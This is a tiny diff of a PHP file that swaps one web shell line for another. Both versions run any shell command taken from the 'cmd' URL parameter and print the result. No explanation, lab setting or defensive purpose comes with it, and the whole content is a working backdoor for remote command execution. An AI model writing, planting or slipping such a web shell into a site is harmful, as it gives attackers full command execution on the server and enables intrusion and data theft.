@@ -1,3 +1,3 @@
 <pre>
-<?=system($_GET["cmd"])?>
+<?=shell_exec($_GET["cmd"])?>
 </pre>
